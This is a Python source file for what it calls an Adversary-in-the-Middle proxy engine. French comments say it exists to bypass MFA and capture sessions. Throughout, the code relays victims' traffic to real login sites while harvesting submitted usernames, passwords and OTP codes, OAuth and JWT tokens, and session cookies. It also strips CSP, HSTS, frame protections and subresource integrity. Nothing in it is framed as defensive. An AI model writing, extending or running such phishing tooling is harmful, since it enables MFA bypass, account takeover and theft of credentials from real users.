
import time
import re
import aiohttp
import asyncio
import json
from http.cookies import SimpleCookie
from typing import Dict, Optional, Tuple, List, Any
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, quote
from fastapi import Request, Response, HTTPException, WebSocket
from starlette.websockets import WebSocketDisconnect
from core.session.session_manager import session_manager
from core.proxy.advanced_link_modifier import AdvancedLinkModifier

class AiTMProxy:
    """
    Adversary-in-the-Middle (AiTM) Proxy Engine v5
    Intercepte et réécrit le trafic pour contourner le MFA et capturer les sessions.
    """
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_domain = "vantablack-proxy.com" # À configurer dynamiquement
        self.session_manager = session_manager
        # Regex pour détecter les URL absolues
        self.url_regex = re.compile(r'https?://[^\s"\']+')
        # Moteur avancé de modification de liens
        self.advanced_modifier = AdvancedLinkModifier()

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            # Utilisation de DummyCookieJar pour éviter le partage d'état entre requêtes
            # Les cookies sont gérés explicitement via les paramètres de requête
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                auto_decompress=True, # Enable auto-decompression for rewriting
                cookie_jar=aiohttp.DummyCookieJar()
            )
        return self.session

    async def proxy_websocket(self, target_url: str, client_ws: WebSocket, session_id: str = None, headers: Dict[str, str] = None, cookies: Dict[str, str] = None):
        """
        Proxy WebSocket traffic bi-directionally.
        """
        # Ensure session is initialized
        session = await self.get_session()
        
        # Prepare headers for upstream
        upstream_headers = dict(headers or {})
        upstream_headers.pop("host", None)
        upstream_headers.pop("sec-websocket-key", None)
        upstream_headers.pop("sec-websocket-extensions", None)
        upstream_headers.pop("upgrade", None)
        upstream_headers.pop("connection", None)
        upstream_headers["origin"] = "/".join(target_url.split("/")[:3]) # Fake origin to target
        
        # Add cookies to headers manually since ws_connect might not support cookies param directly
        if cookies:
            cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            upstream_headers["Cookie"] = cookie_header

        try:
            async with session.ws_connect(
                target_url,
                headers=upstream_headers,
                ssl=False,
                autoping=True
            ) as upstream_ws:
                
                # Bi-directional pipe
                async def client_to_upstream():
                    try:
                        while True:
                            data = await client_ws.receive()
                            if data["type"] == "websocket.disconnect":
                                await upstream_ws.close()
                                break
                            
                            if "text" in data:
                                # Rewriting Client -> Server (rarely needed but good for consistency)
                                # text = self._rewrite_websocket_text(data["text"], target_url, direction="upstream")
                                await upstream_ws.send_str(data["text"])
                            elif "bytes" in data:
                                await upstream_ws.send_bytes(data["bytes"])
                    except (WebSocketDisconnect, RuntimeError):
                        # Client disconnected
                        await upstream_ws.close()
                    except Exception as e:
                        print(f"[WS Client Error] {e}")

                async def upstream_to_client():
                    try:
                        async for msg in upstream_ws:
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                # Rewriting Server -> Client (CRITICAL for MFA redirections)
                                rewritten_text = self._rewrite_websocket_text(msg.data, target_url)
                                await client_ws.send_text(rewritten_text)
                            elif msg.type == aiohttp.WSMsgType.BINARY:
                                await client_ws.send_bytes(msg.data)
                            elif msg.type == aiohttp.WSMsgType.CLOSE:
                                await client_ws.close()
                                break
                            elif msg.type == aiohttp.WSMsgType.ERROR:
                                break
                    except (WebSocketDisconnect, RuntimeError):
                         # Client disconnected
                         pass
                    except Exception as e:
                        print(f"[WS Upstream Error] {e}")
                
                # Run tasks until one completes
                done, pending = await asyncio.wait(
                    [asyncio.create_task(client_to_upstream()), asyncio.create_task(upstream_to_client())],
                    return_when=asyncio.FIRST_COMPLETED
                )
                
                # Cancel pending task
                for task in pending:
                    task.cancel()
                
        except Exception as e:
            print(f"[WS Proxy Error] {e}")
            try:
                await client_ws.close(code=1011)
            except RuntimeError:
                pass # Already closed

    def _rewrite_websocket_text(self, text: str, base_url: str, proxy_base_path: str = "/v5/proxy") -> str:
        """
        Réécrit le contenu textuel des messages WebSocket (JSON ou brut).
        C'est crucial pour les flux MFA qui envoient des URLs de redirection via WS.
        """
        try:
            # 1. Try JSON rewrite
            if text.strip().startswith(("{", "[")):
                try:
                    data = json.loads(text)
                    rewritten_data = self._recursive_rewrite(data, base_url, proxy_base_path)
                    return json.dumps(rewritten_data)
                except json.JSONDecodeError:
                    pass # Not valid JSON, continue to regex
            
            # 2. Regex Replace for any URL found in text
            # This handles cases like "Redirect to https://..." or embedded URLs
            url_pattern = re.compile(r'(?:https?|wss?)://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
            
            def replace_match(match):
                url = match.group(0)
                if self.proxy_domain in url:
                    return url
                return self._rewrite_url(url, base_url, proxy_base_path)
            
            return url_pattern.sub(replace_match, text)
            
        except Exception as e:
            print(f"[WS Rewrite Error] {e}")
            return text

    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None, proxy_base_path: str = "/v5/proxy") -> Response:
        """
        Proxy la requête vers le serveur cible et réécrit la réponse.
        """
        session = await self.get_session()
        
        # Capture Credentials (POST)
        if request.method == "POST" and session_id and body:
            self._capture_credentials(session_id, body, request.headers.get("content-type", ""))

        # Nettoyage des headers
        headers = dict(request.headers)
        headers.pop("host", None)
        headers.pop("content-length", None)
        headers.pop("cookie", None) # On passe les cookies via le paramètre dédié
        headers["user-agent"] = headers.get("user-agent", "Mozilla/5.0") 
        headers["accept-encoding"] = "gzip, deflate" # Force compression standard
        
        method = request.method
        cookies = request.cookies
        
        try:
            async with session.request(
                method, 
                target_url, 
                headers=headers, 
                data=body, 
                cookies=cookies,
                allow_redirects=False
            ) as upstream_response:
                
                content = await upstream_response.read()
                response_headers = dict(upstream_response.headers)
                
                # Capture Cookies (Set-Cookie)
                if session_id:
                    self._capture_response_cookies(session_id, upstream_response.headers, target_url)
                    # Capture Tokens in Response Body (JSON)
                    self._capture_response_tokens(session_id, content, upstream_response.headers.get("content-type", ""))

                # Suppression des headers de sécurité et mise en cache
                for h in ["content-security-policy", "content-security-policy-report-only", "x-frame-options", "strict-transport-security", 
                          "transfer-encoding", "content-encoding", "content-length",
                          "referrer-policy", "x-content-type-options", "x-xss-protection", "access-control-allow-origin"]:
                    response_headers.pop(h, None)
                
                # Add permissive CORS headers
                origin = request.headers.get("origin")
                if origin:
                    response_headers["Access-Control-Allow-Origin"] = origin
                    response_headers["Access-Control-Allow-Credentials"] = "true"
                else:
                    response_headers["Access-Control-Allow-Origin"] = "*"
                
                response_headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS, PUT, DELETE"
                response_headers["Access-Control-Allow-Headers"] = "*"
                
                # Remove Set-Cookie from headers to handle manually
                response_headers.pop("set-cookie", None)

                # Réécriture du header Location (pour les redirections)
                for key in list(response_headers.keys()):
                    if key.lower() == "location":
                        if session_id:
                            self._capture_location_tokens(session_id, response_headers[key])
                        response_headers[key] = self._rewrite_url(response_headers[key], target_url, proxy_base_path)

                # Remove content-security-policy meta tags in HTML
                # This is handled in rewrite_html, but we also ensure no CSP headers remain


                # Réécriture du contenu
                content_type = response_headers.get("content-type", "")
                if "text/html" in content_type:
                    content = self.rewrite_html(content, target_url, proxy_base_path)
                elif "text/css" in content_type:
                    content = self.rewrite_css(content, target_url, proxy_base_path)
                elif "application/json" in content_type:
                    content = self.rewrite_json(content, target_url, proxy_base_path)
                elif "application/javascript" in content_type or "text/javascript" in content_type:
                    content = self.rewrite_js(content, target_url, proxy_base_path)
                
                response = Response(
                    content=content,
                    status_code=upstream_response.status,
                    headers=response_headers,
                    media_type=content_type
                )

                # Rewrite and add Set-Cookie headers
                upstream_cookies = upstream_response.headers.getall("Set-Cookie", [])
                for cookie_raw in upstream_cookies:
                    # Simple rewrite: Remove Domain, Secure if needed
                    # We want to keep the cookie on the current domain (proxy)
                    # So we just strip the Domain attribute.
                    # Also strip Secure if we are on HTTP (dev mode), but assuming HTTPS for now or agnostic
                    
                    # Regex to remove Domain=...;
                    cookie_mod = re.sub(r'(?i);\s*domain=[^;]+', '', cookie_raw)
                    
                    # Force SameSite=None to ensure cross-site delivery if needed (for redirection flows)
                    if "samesite" not in cookie_mod.lower():
                        cookie_mod += "; SameSite=None"
                    else:
                        cookie_mod = re.sub(r'(?i);\s*samesite=[^;]+', '; SameSite=None', cookie_mod)

                    # Ensure Secure is present if SameSite=None (browser requirement)
                    if "secure" not in cookie_mod.lower():
                         cookie_mod += "; Secure"

                    response.headers.append("Set-Cookie", cookie_mod)

                return response
                
        except Exception as e:
            # En prod, logger l'erreur discrètement
            print(f"[AiTM Error] Proxy failed for {target_url}: {e}")
            raise HTTPException(status_code=502, detail="Upstream Error")

    def _capture_credentials(self, session_id: str, body: bytes, content_type: str):
        """
        Analyse le corps de la requête pour extraire les identifiants (Form ou JSON).
        """
        try:
            decoded = body.decode('utf-8', errors='ignore')
            captured = {}
            
            # Mots clés à surveiller
            sensitive_keys = ["user", "username", "login", "email", "password", "pass", "pwd", "otp", "code", "token"]

            if "application/json" in content_type:
                try:
                    data = json.loads(decoded)
                    self._recursive_capture(data, captured, sensitive_keys)
                except json.JSONDecodeError:
                    pass
            else:
                # Fallback form-urlencoded
                parsed = parse_qs(decoded)
                for key, values in parsed.items():
                    if any(s in key.lower() for s in sensitive_keys):
                        captured[key] = values[0] if values else ""
            
            if captured:
                print(f"🎯 [AiTM] CREDENTIALS CAPTURED for session {session_id}:")
                for k, v in captured.items():
                    print(f"   🔑 {k}: {v}")
                    self.session_manager.capture_credential(session_id, k, v)
                print("🎯" + "="*50)
                    
        except Exception as e:
            print(f"[AiTM Warning] Failed to parse POST body: {e}")

    def _recursive_capture(self, data: Any, captured: Dict[str, Any], sensitive_keys: List[str]):
        """Helper pour capturer récursivement les identifiants dans un JSON arbitraire."""
        if isinstance(data, dict):
            for key, value in data.items():
                if any(s in key.lower() for s in sensitive_keys):
                    captured[key] = value
                self._recursive_capture(value, captured, sensitive_keys)
        elif isinstance(data, list):
            for item in data:
                self._recursive_capture(item, captured, sensitive_keys)

    def _capture_response_tokens(self, session_id: str, content: bytes, content_type: str):
        """Capture les tokens (OAuth/JWT) dans le corps de la réponse."""
        try:
            if "application/json" in content_type:
                data = json.loads(content)
                captured = {}
                sensitive_keys = ["access_token", "id_token", "refresh_token", "code", "oauth_token"]
                self._recursive_capture(data, captured, sensitive_keys)
                
                if captured:
                    print(f"[AiTM] Tokens captured for session {session_id}: {captured}")
                    for k, v in captured.items():
                        self.session_manager.capture_credential(session_id, k, v)
        except Exception as e:
            print(f"Warning: Credential capture failed: {e}")
            pass


    def _capture_location_tokens(self, session_id: str, location_url: str):
        """Capture les tokens dans l'URL de redirection (Location header)."""
        try:
            parsed = urlparse(location_url)
            # 1. Query Params (?code=...)
            query_params = parse_qs(parsed.query)
            
            # 2. Hash Params (#access_token=...) - Souvent utilisé dans OIDC Implicit Flow
            hash_params = parse_qs(parsed.fragment)
            
            sensitive_keys = ["code", "access_token", "id_token", "state", "session_state", "oauth_token"]
            captured = {}
            
            for params in [query_params, hash_params]:
                for key, values in params.items():
                    if any(s in key.lower() for s in sensitive_keys):
                        captured[key] = values[0] if values else ""
            
            if captured:
                print(f"[AiTM] Redirect tokens captured for session {session_id}: {captured}")
                for k, v in captured.items():
                    self.session_manager.capture_credential(session_id, k, v)
        except Exception as e:
            print(f"[AiTM Warning] Failed to parse Location header: {e}")

    def _capture_response_cookies(self, session_id: str, headers: Any, target_url: str):
        """Capture et log les cookies de réponse avec tous les attributs."""
        raw_cookies = headers.getall("Set-Cookie", [])
        if raw_cookies:
             print(f"[AiTM] Captured {len(raw_cookies)} cookies for session {session_id}")
             
             parsed_cookies = []
             for cookie_str in raw_cookies:
                 # Log raw cookie
                 self.session_manager.log_raw_cookie(session_id, cookie_str)
                 
                 # Parse cookie with SimpleCookie
                 try:
                     cookie = SimpleCookie()
                     cookie.load(cookie_str)
                     
                     for key, morsel in cookie.items():
                         domain = morsel["domain"]
                         if not domain:
                             domain = urlparse(target_url).hostname

                         cookie_data = {
                             "name": key,
                             "value": morsel.value,
                             "domain": domain,
                             "path": morsel["path"] or "/",
                             "secure": True if morsel["secure"] else False,
                             "httpOnly": True if morsel["httponly"] else False,
                             "sameSite": morsel["samesite"] or "Lax",
                         }
                         
                         # Parse Expiration
                         if morsel["max-age"]:
                             try:
                                 cookie_data["expires"] = int(time.time()) + int(morsel["max-age"])
                             except ValueError:
                                 pass
                         elif morsel["expires"]:
                             pass 
                             
                         parsed_cookies.append(cookie_data)
                 except Exception as e:
                     print(f"[AiTM Warning] Cookie parsing failed: {e}")

             if parsed_cookies:
                 self.session_manager.capture_cookies(session_id, parsed_cookies)

    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str = "") -> str:
        """
        Réécrit une URL absolue pour qu'elle passe par le proxy.
        Ex: https://login.microsoft.com/common/oauth2 -> /v5/proxy?url=https%3A%2F%2Flogin.microsoft.com%2Fcommon%2Foauth2
        """
        if not url:
            return url
            
        # Ignore data:, blob:, mailto:, javascript:
        if url.startswith(("data:", "blob:", "mailto:", "javascript:", "#")):
            return url
            
        # Handle root-relative URLs
        if url.startswith("/"):
            parsed_base = urlparse(base_url)
            full_upstream_url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
            # If using /v5/p/<sid>, join path style
            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
                return f"{proxy_base_path}{url}"
            if proxy_base_path == "/v5/proxy":
                from urllib.parse import quote
                return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
            # Default: path-only
            return url
            
        # Handle absolute URLs
        if url.startswith(("http://", "https://", "ws://", "wss://")):
            # If it's already pointing to our proxy, leave it
            if self.proxy_domain in url:
                return url
            # If using /v5/p/<sid>, append path component only
            parsed = urlparse(url)
            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
                # Keep only the path (and optionally query if present)
                path = parsed.path or ""
                if parsed.query:
                    # If queries exist, fall back to query-style to preserve semantics
                    from urllib.parse import quote
                    encoded = quote(url, safe='/?&=')
                    return f"{proxy_base_path}?url={encoded}"
                return f"{proxy_base_path}{path}"
            # Otherwise, use /v5/proxy with query parameter if specified
            is_ws = url.startswith(("ws://", "wss://"))
            endpoint = "/ws" if is_ws else ""
            if proxy_base_path == "/v5/proxy":
                from urllib.parse import quote
                encoded = quote(url, safe='/?&=')
                return f"{proxy_base_path}{endpoint}?url={encoded}"
            # Default: path-only (preserve query)
            return (parsed.path or url) + (f"?{parsed.query}" if parsed.query else "")
        
        # Handle relative non-root URLs (e.g., "socket")
        try:
            full_upstream_url = urljoin(base_url, url)
            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
                parsed = urlparse(full_upstream_url)
                return f"{proxy_base_path}{parsed.path}"
            if proxy_base_path == "/v5/proxy":
                return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
            # Default path-only (preserve query)
            parsed = urlparse(full_upstream_url)
            return (parsed.path or url) + (f"?{parsed.query}" if parsed.query else "")
        except Exception:
            return url

    def rewrite_html(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Parse et réécrit les liens dans le HTML (href, src, action).
        """
        try:
            soup = BeautifulSoup(content, 'html.parser')
            
            # Tags and attributes to rewrite
            tags = {
                'a': 'href',
                'link': 'href',
                'script': 'src',
                'img': 'src',
                'form': 'action',
                'iframe': 'src',
                'embed': 'src',
                'source': 'src',
                'object': 'data',
                'area': 'href'
            }
            
            for tag, attr in tags.items():
                for element in soup.find_all(tag):
                    if element.has_attr(attr):
                        original = element[attr]
                        rewritten = self._rewrite_url(original, base_url, proxy_base_path)
                        element[attr] = rewritten
            
            # Rewrite inline styles (style tags and attributes)
            for style_tag in soup.find_all('style'):
                if style_tag.string:
                    style_tag.string = self.rewrite_css(style_tag.string.encode('utf-8'), base_url, proxy_base_path).decode('utf-8')
            
            for element in soup.find_all(attrs={"style": True}):
                element['style'] = self.rewrite_css(element['style'].encode('utf-8'), base_url, proxy_base_path).decode('utf-8')

            # Remove integrity checks (Subresource Integrity)
            for element in soup.find_all(attrs={"integrity": True}):
                del element['integrity']
                
            # Remove Meta CSP
            for meta in soup.find_all('meta', attrs={"http-equiv": lambda x: x and x.lower() == 'content-security-policy'}):
                meta.decompose()

            # Rewrite meta refresh URLs if present
            for meta in soup.find_all('meta', attrs={"http-equiv": lambda x: x and x.lower() == 'refresh'}):
                content_attr = meta.get("content")
                if content_attr and "url=" in content_attr.lower():
                    try:
                        parts = content_attr.split(";", 1)
                        prefix = parts[0]
                        url_part = parts[1] if len(parts) > 1 else ""
                        if "url=" in url_part.lower():
                            key, val = url_part.split("=", 1)
                            rewritten = self._rewrite_url(val.strip(), base_url, proxy_base_path)
                            meta["content"] = f"{prefix}; url={rewritten}"
                    except Exception:
                        pass

            return str(soup).encode('utf-8')
        except Exception as e:
            print(f"[AiTM Warning] HTML rewrite failed: {e}")
            return content

    def rewrite_css(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Réécrit les URLs dans les fichiers CSS (url(), @import).
        """
        try:
            text = content.decode('utf-8')
            
            # Regex for url(...) and @import "..."
            # Handles url('...'), url("..."), url(...)
            url_pattern = re.compile(r'url\(\s*[\'"]?([^\'"\)]+)[\'"]?\s*\)', re.IGNORECASE)
            import_pattern = re.compile(r'@import\s+[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
            
            def replace_url(match):
                url = match.group(1)
                # Skip data URIs
                if url.startswith("data:"): return match.group(0)
                rewritten = self._rewrite_url(url, base_url, proxy_base_path)
                return f"url('{rewritten}')"
                
            def replace_import(match):
                url = match.group(1)
                rewritten = self._rewrite_url(url, base_url, proxy_base_path)
                return f"@import '{rewritten}'"

            text = url_pattern.sub(replace_url, text)
            text = import_pattern.sub(replace_import, text)
            
            return text.encode('utf-8')
        except Exception as e:
            print(f"Warning: HTML rewrite failed: {e}")
            return content

    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Réécrit les URLs dans une réponse JSON.
        """
        try:
            data = json.loads(content)
            rewritten = self._recursive_rewrite(data, base_url, proxy_base_path)
            return json.dumps(rewritten).encode('utf-8')
        except:
            return content

    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Réécrit les URLs dans les fichiers JS (Regex simple).
        """
        try:
            text = content.decode('utf-8')
            
            # Regex pour trouver les URLs http/https/ws/wss
            def replace(match):
                url = match.group(0)
                return self._rewrite_url(url, base_url, proxy_base_path)
                
            # Pattern pour http/https/ws/wss
            pattern = re.compile(r'(?:https?|wss?)://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
            rewritten_text = pattern.sub(replace, text)
            
            return rewritten_text.encode('utf-8')
        except:
            return content

    def _recursive_rewrite(self, data: Any, base_url: str, proxy_base_path: str) -> Any:
        """
        Parcourt récursivement un objet JSON/Dict pour réécrire les valeurs URL.
        """
        if isinstance(data, dict):
            return {k: self._recursive_rewrite(v, base_url, proxy_base_path) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._recursive_rewrite(item, base_url, proxy_base_path) for item in data]
        elif isinstance(data, str):
            if data.startswith(("http://", "https://")):
                return self._rewrite_url(data, base_url, proxy_base_path)
            return data
        else:
            return data

# Instance globale
aitm_proxy = AiTMProxy()
